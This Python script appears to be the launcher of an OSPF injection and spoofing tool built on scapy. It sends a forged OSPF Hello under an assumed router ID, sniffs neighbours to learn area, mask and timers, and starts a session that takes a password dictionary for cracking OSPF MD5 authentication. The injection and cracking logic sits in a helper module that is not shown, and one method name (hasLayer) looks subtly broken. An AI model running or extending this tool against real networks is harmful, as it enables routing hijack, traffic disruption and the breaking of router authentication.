import typing
from scapy.contrib.ospf import OSPF_Hdr, OSPF_Hello
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether
from scapy.all import get_if_hwaddr, get_if_addr, sniff, sendp
import argparse
from helper.helper import (
        OSPFSession,
        OSPFConfig,
        LOG,
        ALL_SPF_ROUTERS,
        ALL_SPF_ROUTERS_MAC,
        OSPFType,
        )


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("int", help="Network Interface Card to bind to (e.g. eth0)")
    parser.add_argument("router_id", help="Logical OSPF Router ID to assume (e.g. 10.10.10.10)")
    parser.add_argument("--dict", default="passwords.txt", help="Path to dictionary file for MD5 hash cracking")

    args = parser.parse_args()
    LOG.info("[*] Initializing OSPF Injector...")

    # TODO: UPGRADE TO USE ARGPARSE
    
    # Dynamically Retrieve OSPF fields
    src_ip = get_if_addr(args.int)
    src_mac = get_if_hwaddr(args.int)

    # TODO: Can expand to extract all values here XDD
    extract_details = {
            "area": None,
            "mask": None,
            "hello_interval": None,
            "dead_interval": None,
            }

    def capture_ospf_details(pkt) -> bool:
        """Dynamically extract wanted values from sniffed OSPF packet"""
        if pkt.hasLayer(OSPF_Hdr):
            ospf_packet = pkt[OSPF_Hdr]

            extract_details["area"] = getattr(ospf_packet, "area", "0.0.0.0")
            
            if pkt.hasLayer(OSPF_Hello):
                hello = pkt[OSPF_Hello]

                # Default values based on OSPF_Hello class
                extract_details["mask"] = getattr(hello, "mask", "255.255.255.0")
                extract_details["hello_interval"] = getattr(hello, "hello_interval", 10)
                extract_details["dead_interval"] = getattr(hello, "dead_interval", 40)

                return True
        return False

    # Generic OSPF probing packet
    probe_packet = (
            Ether(src=src_mac, dst=ALL_SPF_ROUTERS_MAC) /
            IP(src=src_ip, dst=ALL_SPF_ROUTERS) /
            OSPF_Hdr(version=2, type=OSPFType.HELLO, src=args.router_id, area="0.0.0.0", authtype=0) /
            OSPF_Hello(mask="255.255.255.0", hellointerval=10, options=0x02, prio=0, deadinterval=40)
            )

    sendp(probe_packet, iface=args.int, verbose=False)

    sniff(iface=args.int, filter="ip proto 89", stop_filter=capture_ospf_details, timeout=3)

    # initialise config
    config = OSPFConfig(
            iface=args.int,
            router_id=args.router_id,
            area=typing.cast(str, extract_details.get("area")),
            mask=typing.cast(str, extract_details.get("mask")),
            hello_interval=typing.cast(int, extract_details.get("hello_interval")),
            dead_interval=typing.cast(int, extract_details.get("dead_interval")),
            )

    session = OSPFSession(config, src_ip, src_mac, args.dict)

    try:
        session.run()
    except KeyboardInterrupt:
        session.running = False
        LOG.info("SPOOFER STOPPED")


if __name__ == "__main__":
    main()
